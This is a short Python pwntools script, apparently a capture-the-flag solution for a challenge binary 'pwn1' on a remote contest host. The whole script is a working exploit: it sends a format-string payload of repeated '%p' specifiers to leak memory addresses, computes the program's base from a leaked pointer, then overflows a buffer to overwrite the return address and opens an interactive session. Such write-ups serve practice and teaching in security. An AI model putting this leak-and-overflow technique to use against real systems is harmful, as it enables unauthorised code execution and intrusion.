from pwn import *

context.arch = "amd64"
print(ELF("./pwn1"))

# p = process("./pwn1")
p = remote("hax1.allesctf.net", 9100)
# gdb.attach(p)

p.recvuntil("Enter your witch name:")
# p.sendline("%lx\t|%lx\t|%lx\t|%lx\t>" * (9))
p.sendline("|".join(["%p"] * (4 * 11 + 3)))

values = p.recvuntil("enter your magic spell:").decode("utf-8").split("|")

# start of code
print("=>", values[-1])

# base adr of r-w memory
code = int(values[-1][:14], 16) - 0xAF4
# shellcode at 0x55bfa0daa9f0
wanted = code + 0x9F0

p.sendline(b"Expelliarmus\x00" + b"A" * 251 + p64(wanted))

p.interactive()
